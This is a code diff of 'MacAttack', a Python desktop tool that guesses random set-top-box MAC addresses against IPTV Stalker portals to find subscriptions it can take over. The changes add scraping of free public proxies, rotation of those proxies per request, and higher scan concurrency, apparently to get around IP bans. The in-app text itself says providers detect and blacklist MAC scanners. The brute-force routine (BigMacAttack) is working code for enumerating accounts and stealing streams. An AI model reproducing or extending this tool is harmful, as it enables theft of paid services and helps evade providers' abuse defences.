@@ -13,6 +13,7 @@ from PyQt5.QtGui import QFont, QPixmap, QIcon, QStandardItemModel, QStandardItem
 from PyQt5.QtWidgets import QMainWindow, QFrame, QApplication, QVBoxLayout, QLineEdit, QLabel, QPushButton, QWidget, QTabWidget, QMessageBox, QListView, QHBoxLayout, QCheckBox, QAbstractItemView, QProgressBar, QSpinBox, QTextEdit, QSpacerItem, QSizePolicy
 import requests
 import concurrent.futures
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 from urllib.parse import quote, urlparse, urlunparse
 import configparser
@@ -39,7 +40,7 @@ def get_token(session, url, mac_address):
              "timezone": "America/Los_Angeles",
         }
         headers = {"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)"}
-        response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=10)
+        response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=20)
         response.raise_for_status()
         token = response.json().get("js", {}).get("token")
         if token:
@@ -51,6 +52,157 @@ def get_token(session, url, mac_address):
     except Exception as e:
         logging.error(f"Error getting token: {e}")
         return None
+
+class ProxyFetcher(QThread):
+    """
+    A QThread that fetches and tests proxies in the background.
+    It emits signals to update the UI with the results.
+    """
+    # Signal to update the proxy output in the UI
+    update_proxy_output_signal = pyqtSignal(str)
+    update_proxy_textbox_signal = pyqtSignal(str)
+
+    def __init__(self):
+        super().__init__()
+
+    def run(self):
+        """
+        Runs the proxy fetching and testing process in a background thread.
+        """
+        self.fetch_and_test_proxies()
+
+    def fetch_and_test_proxies(self):
+        """
+        Fetches and tests proxies, emitting signals to update the UI.
+        """
+        # Step 1: Fetch proxies
+        all_proxies = self.fetch_proxies()
+
+        # If no proxies are fetched, emit an error and return
+        if not all_proxies:
+            self.update_proxy_output_signal.emit("No proxies found, check internet connection, or remove non working proxy in Mac VideoPlayer tab.")
+            return
+
+        original_count = len(all_proxies)
+        
+        # Remove duplicates
+        all_proxies = list(set(all_proxies))
+        duplicates_removed = original_count - len(all_proxies)
+        self.update_proxy_output_signal.emit(f"Total proxies fetched: {original_count}\n")
+        self.update_proxy_output_signal.emit(f"Duplicates removed: {duplicates_removed}\n")
+
+        # Step 2: Test proxies
+        working_proxies = []
+        self.update_proxy_output_signal.emit("Testing proxies...")
+        
+        with ThreadPoolExecutor(max_workers=100) as executor:
+            future_to_proxy = {executor.submit(self.test_proxy, proxy): proxy for proxy in all_proxies}
+            for future in as_completed(future_to_proxy):
+                proxy = future_to_proxy[future]
+                try:
+                    proxy, is_working = future.result()
+                    if is_working:
+                        self.update_proxy_output_signal.emit(f"Proxy {proxy} is working.")
+                        working_proxies.append(proxy)
+                    else:
+                        self.update_proxy_output_signal.emit(f"Proxy {proxy} failed.")
+                except Exception as e:
+                    #self.update_proxy_output_signal.emit(f"Error testing proxy {proxy}: {str(e)}")
+                    logging.debug(f"Error testing proxy {proxy}: {str(e)}")
+
+        # Step 3: Update the proxy_textbox with working proxies
+        if working_proxies:
+            self.update_proxy_textbox_signal.emit("\n".join(working_proxies))
+        else:
+            self.update_proxy_output_signal.emit("No working proxies found.")
+            
+    def fetch_proxies(self):
+        """
+        Fetch proxies from different sources and return them as a list of strings.
+        This method will bypass the main thread's proxy if one is set.
+        """
+        proxies = []
+        
+        # Temporarily disable the main proxy if it's set
+        current_proxies = requests.Session().proxies  # This gets the session proxy
+        if current_proxies:
+            # Store current proxy settings to restore them later
+            original_proxies = current_proxies.copy()
+            # Remove proxy for this function
+            requests.Session().proxies = {}
+        else:
+            original_proxies = None
+
+        try:
+            # Fetch proxy data from spys.me
+            response_spys = requests.get("https://spys.me/proxy.txt", timeout=10)
+            if response_spys.status_code == 200:
+                regex = r"[0-9]+(?:\.[0-9]+){3}:[0-9]+"
+                matches = re.finditer(regex, response_spys.text, re.MULTILINE)
+                proxies.extend([match.group() for match in matches])
+        except requests.exceptions.RequestException as e:
+            self.update_proxy_output_signal.emit(f"Error scraping proxies 1")
+        
+        try:
+            # Fetch proxy data from free-proxy-list.net
+            response_free_proxy = requests.get("https://free-proxy-list.net/", timeout=10)
+            if response_free_proxy.status_code == 200:
+                html_content = response_free_proxy.text
+                ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
+                matches = ip_port_pattern.findall(html_content)
+                proxies.extend([f"{ip}:{port}" for ip, port in matches])
+        except requests.exceptions.RequestException as e:
+            self.update_proxy_output_signal.emit(f"Error scraping proxies 2")
+        
+        try:
+            # Fetch proxy data from sslproxies.org
+            response_sslproxies = requests.get("https://www.sslproxies.org/", timeout=10)
+            if response_sslproxies.status_code == 200:
+                html_content = response_sslproxies.text
+                ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
+                matches = ip_port_pattern.findall(html_content)
+                proxies.extend([f"{ip}:{port}" for ip, port in matches])
+        except requests.exceptions.RequestException as e:
+            self.update_proxy_output_signal.emit(f"Error scraping proxies 3")
+        
+        try:
+            # Fetch proxy data from https://www.freeproxy.world/
+            response_freeproxyworld = requests.get("https://www.freeproxy.world/", timeout=10)
+            if response_freeproxyworld.status_code == 200:
+                html_content = response_freeproxyworld.text
+                ip_port_pattern = re.compile(
+                    r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
+                    r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>'
+                ) 
+                matches = ip_port_pattern.findall(html_content)
+                proxies.extend([f"{ip}:{port}" for ip, port in matches])
+        except requests.exceptions.RequestException as e:
+            self.update_proxy_output_signal.emit(f"Error scraping proxies 4")
+
+        # Restore the original proxy settings if they were removed
+        if original_proxies is not None:
+            requests.Session().proxies = original_proxies
+
+        return proxies
+
+    def test_proxy(self, proxy):
+        """
+        Tests if the given proxy is working by making a request to a test site.
+        """
+        url = "http://httpbin.org/ip"  # This site will return your IP as seen by the server
+        proxies = {
+            "http": f"http://{proxy}",
+            "https": f"http://{proxy}"
+        }
+        try:
+            response = requests.get(url, proxies=proxies, timeout=10)
+            if response.status_code == 200:
+                return proxy, True
+        except requests.RequestException as e:
+            logging.debug(f"Error testing proxy {proxy}: {str(e)}")
+            #self.update_proxy_output_signal.emit(f"Error testing proxy {proxy}: {str(e)}")
+        return proxy, False
+
 
 class RequestThread(QThread):
     request_complete = pyqtSignal(dict)  # Signal emitted when the request is complete
@@ -161,7 +313,7 @@ class RequestThread(QThread):
                  "timezone": "America/Los_Angeles",
             }
             headers = {"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)"}
-            response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=10)
+            response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=20)
             response.raise_for_status()
             token = response.json().get("js", {}).get("token")
             if token:
@@ -193,7 +345,7 @@ class RequestThread(QThread):
                 "Authorization": f"Bearer {token}",
                 "X-User-Agent": "Model: MAG250; Link: WiFi",
             }
-            response = session.get(genres_url, cookies=cookies, headers=headers, timeout=10)
+            response = session.get(genres_url, cookies=cookies, headers=headers, timeout=20)
             response.raise_for_status()
             genre_data = response.json().get("js", [])
             if genre_data:
@@ -235,7 +387,7 @@ class RequestThread(QThread):
                 "Authorization": f"Bearer {token}",
                 "X-User-Agent": "Model: MAG250; Link: WiFi",
             }
-            response = session.get(vod_url, cookies=cookies, headers=headers, timeout=10)
+            response = session.get(vod_url, cookies=cookies, headers=headers, timeout=20)
             response.raise_for_status()
             categories_data = response.json().get("js", [])
             if categories_data:
@@ -276,7 +428,7 @@ class RequestThread(QThread):
                 "Authorization": f"Bearer {token}",
                 "X-User-Agent": "Model: MAG250; Link: WiFi",
             }
-            response = session.get(series_url, cookies=cookies, headers=headers, timeout=10)
+            response = session.get(series_url, cookies=cookies, headers=headers, timeout=20)
             response.raise_for_status()
             response_json = response.json()
             logging.debug(f"Series categories response: {response_json}")
@@ -336,7 +488,7 @@ class RequestThread(QThread):
                 for attempt in range(retries):
                     try:
                         logging.debug(f"Fetching channels from URL: {channels_url}")
-                        response = session.get(channels_url, cookies=cookies, headers=headers, timeout=10)
+                        response = session.get(channels_url, cookies=cookies, headers=headers, timeout=20)
                         if response.status_code == 200:
                             channels_data = response.json().get("js", {}).get("data", [])
                             for channel in channels_data:
@@ -435,9 +587,20 @@ class MacAttack(QMainWindow):
     update_mac_label_signal = pyqtSignal(str)
     update_output_text_signal = pyqtSignal(str)
     update_error_text_signal = pyqtSignal(str)
+    macattack_update_proxy_textbox_signal = pyqtSignal(str)  # macattack clean bad proxies
+    
+    proxies_fetched_signal = pyqtSignal(str)  # Signal to send fetched proxies to the UI
+    working_proxies_signal = pyqtSignal(str)  # Signal to send working proxies to the UI
+    error_signal = pyqtSignal(str)  # Signal to send errors to the UI
+    output_signal = pyqtSignal(str)  # Signal to send print output to QTextEdit
 
     def __init__(self):
         super().__init__()
+        
+        # Initial VLC instance setup (without proxy)
+        self.instance = vlc.Instance('--no-xlib', '--vout=directx', '--no-plugins-cache', '--log-verbose=1')  # Windows
+        self.videoPlayer = self.instance.media_player_new()
+        
         self.set_window_icon()
         self.setWindowTitle("MacAttack by Evilvirus")
         self.setGeometry(200, 200, 1138, 522)
@@ -448,6 +611,13 @@ class MacAttack(QMainWindow):
         self.output_file = None
         self.video_worker = None  # Initialize to None
         self.current_request_thread = None  # Initialize here
+
+        # Initialize ProxyFetcher thread
+        self.proxy_fetcher = ProxyFetcher()
+        # Connect signals from ProxyFetcher to update the UI
+        self.proxy_fetcher.update_proxy_output_signal.connect(self.update_proxy_output)
+        self.proxy_fetcher.update_proxy_textbox_signal.connect(self.update_proxy_textbox)
+        self.macattack_update_proxy_textbox_signal.connect(self.macattack_update_proxy_textbox)
 
         QApplication.setStyle("Fusion")
 
@@ -549,6 +719,10 @@ class MacAttack(QMainWindow):
         self.build_mac_videoPlayer_gui(self.mac_videoPlayer_frame)
         self.tabs.addTab(self.mac_videoPlayer_frame, "Mac VideoPlayer")
 
+        self.Proxy_frame = QWidget()
+        self.build_Proxy_gui(self.Proxy_frame)
+        self.tabs.addTab(self.Proxy_frame, "Proxies")
+
         self.Settings_frame = QWidget()
         self.build_Settings_gui(self.Settings_frame)
         self.tabs.addTab(self.Settings_frame, "Settings")
@@ -588,10 +762,6 @@ class MacAttack(QMainWindow):
         parent.layout().setSpacing(0)
         parent.layout().addWidget(central_widget)
 
-        # Initialize VLC instance
-        self.instance = vlc.Instance('--no-xlib', '--vout=directx', '--no-plugins-cache', '--log-verbose=1')  # Windows
-        self.videoPlayer = self.instance.media_player_new()
-
         # Main layout with two sections: left (controls) and right (video + buttons)
         main_layout = QHBoxLayout(central_widget)
         main_layout.setContentsMargins(0, 0, 0, 0)
@@ -627,19 +797,33 @@ class MacAttack(QMainWindow):
         self.playlist_layout.setSpacing(0)
         self.spacer = QSpacerItem(30, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)       
         self.playlist_layout.addItem(self.spacer) 
-        
+
+        # Proxy input layout
+        self.proxy_layout = QHBoxLayout()
+        self.proxy_layout.setContentsMargins(0, 0, 0, 0)
+        self.proxy_layout.setSpacing(0)
+        self.proxy_label = QLabel("Proxy:")
+        self.proxy_layout.addWidget(self.proxy_label)
+        self.proxy_input = QLineEdit()
+        self.proxy_input.setPlaceholderText("Optional")
+        self.proxy_layout.addWidget(self.proxy_input)
+        self.left_layout.addLayout(self.proxy_layout)
+
         self.get_playlist_button = QPushButton("Get Playlist")
         self.playlist_layout.addWidget(self.get_playlist_button)
         self.get_playlist_button.clicked.connect(self.get_playlist)
         
         self.left_layout.addLayout(self.playlist_layout)
-              
+
+        # Connect proxy input change to proxy update
+        self.proxy_input.textChanged.connect(self.update_vlc_proxy)
+
         # Add the search input field above the tabs
         self.search_input = QLineEdit(self)
         self.search_input.setPlaceholderText("Filter Playlist...")
         self.search_input.textChanged.connect(self.filter_playlist)  # Connect to the filtering function
         self.left_layout.addWidget(self.search_input, alignment=Qt.AlignLeft)
-        
+
         # Create a QTabWidget (for "Live", "Movies", "Series")
         self.tab_widget = QTabWidget()
         self.left_layout.addWidget(self.tab_widget)
@@ -647,12 +831,6 @@ class MacAttack(QMainWindow):
         # Dictionary to hold tab data
         self.tab_data = {}
 
-        # Add left margin to self.left_layout
-        self.left_layout.setContentsMargins(10, 0, 0, 0)
-
-        # Add a left margin to self.tab_widget
-        self.tab_widget.setContentsMargins(10, 0, 0, 0)
-        
         for tab_name in ["Live", "Movies", "Series"]:
             tab = QWidget()
             tab_layout = QVBoxLayout(tab)
@@ -731,7 +909,7 @@ class MacAttack(QMainWindow):
             base_path = os.path.abspath(".")
         video_path = os.path.join(base_path, 'include', 'intro.mp4')
         self.videoPlayer.set_media(self.instance.media_new(video_path))
-
+        self.videoPlayer.play()
         # Disable mouse and key input for video
         self.videoPlayer.video_set_mouse_input(False)
         self.videoPlayer.video_set_key_input(False)
@@ -741,6 +919,55 @@ class MacAttack(QMainWindow):
         self.progress_animation.setDuration(1000)
         self.progress_animation.setEasingCurve(QEasingCurve.Linear)
 
+    def update_vlc_proxy(self):
+        """Update the proxy settings in VLC based on user input."""
+        proxy_address = self.proxy_input.text()
+
+        # Set or remove the environment variables for the proxy
+        if proxy_address:
+            os.environ["http_proxy"] = proxy_address
+            os.environ["https_proxy"] = proxy_address
+        else:
+            if "http_proxy" in os.environ:
+                del os.environ["http_proxy"]
+            if "https_proxy" in os.environ:
+                del os.environ["https_proxy"]
+
+        # Restart the entire VLC instance and media player
+        self.restart_vlc_instance()
+
+    def restart_vlc_instance(self):
+        proxy_address = self.proxy_input.text()
+        """Restart VLC with the new proxy settings."""
+        self.videoPlayer.release()  # Release the old player
+        self.instance.release()     # Release the old instance
+
+        # Reinitialize VLC instance with updated proxy environment variables
+        self.instance = vlc.Instance(
+            f'--http-proxy={proxy_address}',  # Proxy shenanigans!
+            '--no-xlib',                     # Keep it quiet in X11 environments.
+            '--vout=directx',                # DirectX for the win (Windows specific).
+            '--no-plugins-cache',            # Cache is for the weak.
+            '--log-verbose=1'                # We like it chatty in the logs.
+        )
+        self.videoPlayer = self.instance.media_player_new()
+
+        # Reconfigure video frame (this step depends on the platform)
+        if sys.platform.startswith('linux'):
+            self.videoPlayer.set_xwindow(self.video_frame.winId())
+        elif sys.platform == "win32":
+            self.videoPlayer.set_hwnd(self.video_frame.winId())
+        elif sys.platform == "darwin":
+            self.videoPlayer.set_nsobject(int(self.video_frame.winId()))
+         # Load intro video
+        if getattr(sys, 'frozen', False):
+            base_path = sys._MEIPASS
+        else:
+            base_path = os.path.abspath(".")
+        video_path = os.path.join(base_path, 'include', 'intro.mp4')
+        self.videoPlayer.set_media(self.instance.media_new(video_path))       
+        
+        
     def filter_playlist(self):
         search_term = self.search_input.text().lower()
 
@@ -835,6 +1062,186 @@ class MacAttack(QMainWindow):
         self.current_request_thread = self.request_thread  # Set the current request thread
         logging.info("Started new RequestThread for playlist.")
 
+    def build_Proxy_gui(self, parent):
+        proxy_layout = QVBoxLayout(parent)
+
+        # Horizontal layout for checkbox and other input
+        proxy_checkbox_layout = QHBoxLayout()
+
+        # Add a 15px space on the left side
+        proxy_checkbox_layout.addSpacing(15)
+
+        # Checkbox for enabling proxy fetching
+        self.proxy_enabled_checkbox = QCheckBox("Enable Proxies")
+        self.proxy_enabled_checkbox.setFixedWidth(120)  # Set the checkbox width to 120px
+        proxy_checkbox_layout.addWidget(self.proxy_enabled_checkbox)
+
+        # Add a stretch to push elements to the right
+        proxy_checkbox_layout.addStretch(1)
+
+        # Label for "Remove proxies from list after"
+        self.proxy_label = QLabel("Remove proxies after")
+        self.proxy_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
+        proxy_checkbox_layout.addWidget(self.proxy_label)
+
+        # SpinBox for error count
+        self.proxy_remove_errorcount = QSpinBox()
+        self.proxy_remove_errorcount.setRange(0, 9)  # Restrict to 2-digit range
+        self.proxy_remove_errorcount.setFixedWidth(30)  # Set width for 2 digits
+        self.proxy_remove_errorcount.setValue(1)  # Default value
+        self.proxy_remove_errorcount.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
+        proxy_checkbox_layout.addWidget(self.proxy_remove_errorcount)
+
+        # Label for "connection errors"
+        self.connection_errors_label = QLabel("connection errors. (0 to disable)")
+        self.connection_errors_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
+        proxy_checkbox_layout.addWidget(self.connection_errors_label)
+
+        # Add a 15px space after the "connection errors" label
+        spacer_after_errors = QSpacerItem(15, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
+        proxy_checkbox_layout.addItem(spacer_after_errors)
+
+        # Ensure all elements are aligned to the right
+        proxy_checkbox_layout.setSpacing(0)  # Remove spacing between widgets
+        proxy_checkbox_layout.setAlignment(Qt.AlignRight)
+
+        # Align the checkbox layout components
+        proxy_checkbox_layout.setAlignment(self.proxy_enabled_checkbox, Qt.AlignLeft)
+        proxy_checkbox_layout.setAlignment(self.proxy_label, Qt.AlignLeft)
+        proxy_checkbox_layout.setAlignment(self.proxy_remove_errorcount, Qt.AlignLeft)
+        proxy_checkbox_layout.setAlignment(self.connection_errors_label, Qt.AlignLeft)
+
+        # Add the checkbox layout to the main layout
+        proxy_layout.addLayout(proxy_checkbox_layout)
+
+        # Label above the text box with 15px left margin
+        proxybox_label = QLabel("Proxy list, Enter proxies into this box, or get some with the button below")
+        proxybox_label.setContentsMargins(15, 0, 0, 0)  # Add 15px space on the left side
+        proxy_layout.addWidget(proxybox_label)
+
+        # Output Text Area
+        self.proxy_textbox = QTextEdit()
+        self.proxy_textbox.setStyleSheet("""
+            color: black;
+            background-color: lightgrey;
+            border-left: 12px solid #2E2E2E;
+            border-right: 12px solid #2E2E2E;
+            border-bottom:  none;
+            border-top: none;
+        """)
+
+        self.proxy_textbox.setReadOnly(False)
+        monospace_font = QFont("Lucida Console", 10)  # You can use "Courier New" or other monospaced fonts like "Consolas"
+        self.proxy_textbox.setFont(monospace_font)
+        proxy_layout.addWidget(self.proxy_textbox)
+
+        # Create a horizontal layout for the button and speed input
+        generate_proxy_layout = QHBoxLayout()
+
+        # Add spacer to the left of the generate button
+        left_spacer_button = QSpacerItem(15, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
+        generate_proxy_layout.addItem(left_spacer_button)
+
+        # Button to generate proxies, connects to self.get_proxies() method
+        self.generate_button = QPushButton("Get Working Proxies")
+        self.generate_button.clicked.connect(self.get_proxies)
+        self.generate_button.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)  # Set the size policy
+
+        # Speed input (SpinBox)
+        self.proxy_speed_label = QLabel("Speed:")
+        self.proxy_concurrent_tests = QSpinBox()
+        self.proxy_concurrent_tests.setRange(1, 100)
+        self.proxy_concurrent_tests.setValue(100)
+
+        # Set the spinbox alignment explicitly
+        self.proxy_concurrent_tests.setAlignment(Qt.AlignLeft)
+
+        # Add the button and speed input to the horizontal layout
+        generate_proxy_layout.addWidget(self.generate_button)
+        generate_proxy_layout.addSpacing(15)  # Add 15px spacing between the button and the spinbox
+
+        generate_proxy_layout.addWidget(self.proxy_speed_label)
+        generate_proxy_layout.addWidget(self.proxy_concurrent_tests)
+
+        # Spacer to push the proxy count label to the right
+        generate_proxy_layout.addStretch(1)  # This will push everything else to the left
+
+        # Proxy count label that will be updated
+        self.proxy_count_label = QLabel("Proxies: 0")
+        self.proxy_count_label.setAlignment(Qt.AlignRight)  # Align the label to the right
+
+        # Add 15px space to the right of the label using margins
+        self.proxy_count_label.setContentsMargins(0, 0, 15, 0)  # Add 15px space to the right side of the label
+
+        # Add the proxy count label to the layout
+        generate_proxy_layout.addWidget(self.proxy_count_label)
+
+        # Align the layout itself to the left
+        generate_proxy_layout.setAlignment(Qt.AlignLeft)
+
+        # Add the horizontal layout to the main proxy layout
+        proxy_layout.addLayout(generate_proxy_layout)
+
+        # Proxy console output Area
+        self.proxy_output = QTextEdit()
+        self.proxy_output.setStyleSheet("""
+            color: green;
+            background-color: black;
+            border-left: 12px solid #2E2E2E;
+            border-right: 12px solid #2E2E2E;
+            border-bottom: none;
+            border-top: none;
+        """)
+        self.proxy_output.setHtml("Proxy testing will output here...\n")
+        self.proxy_output.setReadOnly(True)
+        self.proxy_output.setFont(monospace_font)
+
+        # Set the maximum height to 200px
+        self.proxy_output.setMaximumHeight(60)
+
+        # Add the proxy output area to the layout
+        proxy_layout.addWidget(self.proxy_output)
+
+        # Connect the textChanged signal to update the proxy count
+        self.proxy_textbox.textChanged.connect(self.update_proxy_count)
+    
+    def update_proxy_count(self):
+        # Get the number of lines in the proxy_textbox
+        proxy_lines = self.proxy_textbox.toPlainText().splitlines()
+        proxy_count = len(proxy_lines)
+        
+        # Update the label with the current number of proxies
+        self.proxy_count_label.setText(f"Proxies: {proxy_count}")    
+    
+
+    
+    def get_proxies(self):
+        """
+        Starts the ProxyFetcher thread to fetch and test proxies.
+        """
+        self.proxy_fetcher.start()  # Start the background thread
+
+    def update_proxy_output(self, text):
+        """
+        Updates the proxy_output textbox with the provided text.
+        """
+        self.proxy_output.append(text)
+
+    def update_proxy_textbox(self, proxies):
+        """
+        Updates the proxy_textbox with the working proxies.
+        """
+        self.proxy_textbox.setText(proxies)
+
+    def show_error(self, error_message):
+        """
+        Show error message in a dialog or status bar.
+        """
+        # You can show the error in a dialog or status bar
+        print(f"Error: {error_message}")
+        # Or use QMessageBox to show a pop-up error
+        # QMessageBox.critical(self, "Error", error_message)
+
     def build_Settings_gui(self, Settings_frame):
         # Create the layout for the settings frame
         Settings_layout = QVBoxLayout(Settings_frame)
@@ -886,13 +1293,12 @@ class MacAttack(QMainWindow):
 
         # Add the list of tips
         tips_text = QLabel(
-            "1.) Use a VPN while scanning in order to stop your IP address from getting banned.<br>"
-            "2.) Only open 1 video stream at a time per MAC, so you don’t get that MAC banned.<br><br>"
             "<b>Video Controls:</b><br>"
             "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mouseclick/Space Bar - Toggle Pause<br>"
             "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Doubleclick/ESC - Toggle Fullscreen<br><br>"
             "If you're getting error 456/458 (perhaps others as well), either the MAC, or your IP has been banned.<br>"
             "Many IPTV providers can detect MAC scanners."
+            "And they will blacklist a Mac if it looks like its been shared"
         )
         tips_text.setAlignment(Qt.AlignTop)
         Settings_layout.addWidget(tips_text)
@@ -934,7 +1340,7 @@ class MacAttack(QMainWindow):
         # Speed input (SpinBox)
         self.speed_label = QLabel("Speed:")
         self.concurrent_tests = QSpinBox()
-        self.concurrent_tests.setRange(1, 15)
+        self.concurrent_tests.setRange(1, 50)
         self.concurrent_tests.setValue(10)
         combined_layout.addWidget(self.speed_label)
         combined_layout.addWidget(self.concurrent_tests)
@@ -1006,7 +1412,7 @@ class MacAttack(QMainWindow):
             border-right: 12px solid #2E2E2E;
             border-bottom: 0px;
         """)
-        self.error_text.setHtml("Error LOG:<br>It's normal for a few errors to appear down here.<br>If <b>Empty response</b> errors are getting spammed, lower the speed.")
+        self.error_text.setHtml("Error LOG:<br>It's normal for errors to appear down here.<br>If <b>503 Service Temporarily Unavailable</b> errors are getting spammed, lower the speed.")
         self.error_text.setReadOnly(True)
         self.error_text.setFont(monospace_font)
         layout.addWidget(self.error_text)
@@ -1031,7 +1437,11 @@ class MacAttack(QMainWindow):
             'autostop': str(self.autostop_checkbox.isChecked()),  # Save autostop checkbox state
             'successsound': str(self.successsound_checkbox.isChecked()),  # Save successsound checkbox state
             'autopause': str(self.autopause_checkbox.isChecked()),  # Save autopause checkbox state
-            'active_tab': str(self.tabs.currentIndex())  # Save the index of the active tab
+            'active_tab': str(self.tabs.currentIndex()),  # Save the index of the active tab
+            'proxy_enabled': str(self.proxy_enabled_checkbox.isChecked()),  # Save proxy checkbox state
+            'proxy_list': self.proxy_textbox.toPlainText(),  # Save proxy list
+            'proxy_concurrent_tests': str(self.proxy_concurrent_tests.value()),  # Save proxy concurrent tests value
+            'proxy_remove_errorcount': str(self.proxy_remove_errorcount.value())  # Save proxy_remove_errorcount value
         }
         
         config['Window'] = {
@@ -1072,13 +1482,29 @@ class MacAttack(QMainWindow):
             self.autostop_checkbox.setChecked(autostop_state == "True")  # Set checkbox based on saved state
 
             # Load successsound_checkbox state
-            autostop_state = config.get('Settings', 'successsound', fallback="False")
-            self.successsound_checkbox.setChecked(autostop_state == "True")  # Set checkbox based on saved state
+            successsound_state = config.get('Settings', 'successsound', fallback="False")
+            self.successsound_checkbox.setChecked(successsound_state == "True")  # Set checkbox based on saved state
 
             # Load autopause_checkbox state
-            autostop_state = config.get('Settings', 'autopause', fallback="True")
-            self.autopause_checkbox.setChecked(autostop_state == "True")  # Set checkbox based on saved state
+            autopause_state = config.get('Settings', 'autopause', fallback="True")
+            self.autopause_checkbox.setChecked(autopause_state == "True")  # Set checkbox based on saved state
             
+            # Load proxy settings
+            proxy_enabled_state = config.get('Settings', 'proxy_enabled', fallback="False")
+            self.proxy_enabled_checkbox.setChecked(proxy_enabled_state == "True")
+            
+            # Load proxy list
+            proxy_list = config.get('Settings', 'proxy_list', fallback="")
+            self.proxy_textbox.setPlainText(proxy_list)
+            
+            # Load proxy concurrent tests value
+            proxy_concurrent_tests_value = config.getint('Settings', 'proxy_concurrent_tests', fallback=100)
+            self.proxy_concurrent_tests.setValue(proxy_concurrent_tests_value)
+
+            # Load the proxy remove error count value
+            proxy_remove_errorcount_value = config.getint('Settings', 'proxy_remove_errorcount', fallback=1)  # Default to 1
+            self.proxy_remove_errorcount.setValue(proxy_remove_errorcount_value)
+
             # Load active tab
             active_tab = config.getint('Settings', 'active_tab', fallback=0)  # Default to first tab if not found
             self.tabs.setCurrentIndex(active_tab)  # Set the active tab
@@ -1123,9 +1549,9 @@ class MacAttack(QMainWindow):
         self.base_url = f"http://{self.host}:{self.port}"
 
         num_tests = self.concurrent_tests.value()
-        # Limit to a maximum of 15 concurrent tests, 'cause we’re not running a circus here.
-        if num_tests > 15:
-            num_tests = 15
+        # Limit a maximum concurrent tests, 'cause we’re not running a circus here.
+        if num_tests > 50:
+            num_tests = 50
 
         # Start threads to test MACs
         for _ in range(num_tests):
@@ -1138,75 +1564,91 @@ class MacAttack(QMainWindow):
     def RandomMacGenerator(self, prefix="00:1A:79:"):
         # Create random MACs. Purely for mischief. Don't tell anyone.
         return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
+
+    def macattack_update_proxy_textbox(self, new_text):
+        # Slot to handle signal
+        self.proxy_textbox.setText(new_text)
             
     def BigMacAttack(self):
+        
+        proxies = []  # Default to empty list in case no proxies are provided
+        proxy_error_counts = {}  # Dictionary to track error counts for each proxy
         self.error_count = 0
         # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.
         while self.running:  # Loop will continue as long as self.running is True
+            if self.proxy_enabled_checkbox.isChecked():
+                # Get the proxies from the textbox, splitting by line
+                proxies = self.proxy_textbox.toPlainText().strip().splitlines()
+
+                # Check if the proxy list is empty
+                if not proxies:
+                    # Show error message
+                    self.stop_button.click()
+                    self.update_error_text_signal.emit("ERROR: Proxy list is empty")
+                    return  # Stop the process if no proxies are available
+
+                # Choose a random proxy from the list
+                selected_proxy = random.choice(proxies)
+                print(f"Using proxy: {selected_proxy}")
+                # Ensure the proxy is set correctly as a dictionary
+                proxies = {"http": selected_proxy, "https": selected_proxy}
+
             mac = self.RandomMacGenerator()  # Generate a random MAC
-            self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
+            if not proxies:
+                self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
+            if proxies:
+                self.update_mac_label_signal.emit(f"Testing MAC: {mac}, Using PROXY: {selected_proxy}")
 
             try:
                 s = requests.Session()  # Create a session
                 s.cookies.update({'mac': mac})
                 url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
 
-                res = s.get(url, timeout=10, allow_redirects=False)
+                # If proxy is enabled, add the proxy to the session
+                if proxies:
+                    s.proxies.update(proxies)
+
+                res = s.get(url, timeout=30, allow_redirects=False)
+
                 if res.text:
                     data = json.loads(res.text)
                     tok = data.get('js', {}).get('token')  # Safely access token to prevent KeyError
 
                     url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
-                    #headers = {"Authorization": f"Bearer {tok}"}
                     headers = {
                         "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                         "Authorization": f"Bearer {tok}",
                         "X-User-Agent": "Model: MAG250; Link: WiFi",
-                    }                    
-                    
-                    
-                    
-                    
-                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)
+                    }
+
+                    res2 = s.get(url2, headers=headers, timeout=30, allow_redirects=False)
 
                     if res2.text:
                         data = json.loads(res2.text)
-                        # Ensure required keys exist before accessing
-                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:  
+                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
                             mac = data['js']['mac']
                             expiry = data['js']['phone']
 
                             url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
-                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
+                            res3 = s.get(url3, headers=headers, timeout=30, allow_redirects=False)
 
                             count = 0
                             if res3.status_code == 200:
-                                
                                 url4 = f"{self.base_url}/portal.php?type=itv&action=create_link&cmd=http://localhost/ch/1_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
-                                res4 = s.get(url4, headers=headers, timeout=10, allow_redirects=False) 
